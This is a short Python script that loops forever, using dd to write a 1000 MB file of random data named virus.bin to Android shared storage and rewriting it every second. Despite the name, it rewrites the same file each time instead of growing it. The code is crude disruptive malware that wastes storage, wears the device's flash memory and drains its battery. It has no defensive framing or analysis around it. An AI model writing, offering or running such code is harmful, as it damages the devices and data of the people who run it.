import os
import time

def main():
    while True:
        os.system("dd if=/dev/urandom of=/storage/emulated/0/virus.bin bs=1M count=1000")
        time.sleep(1)

if __name__ == "__main__":
    main()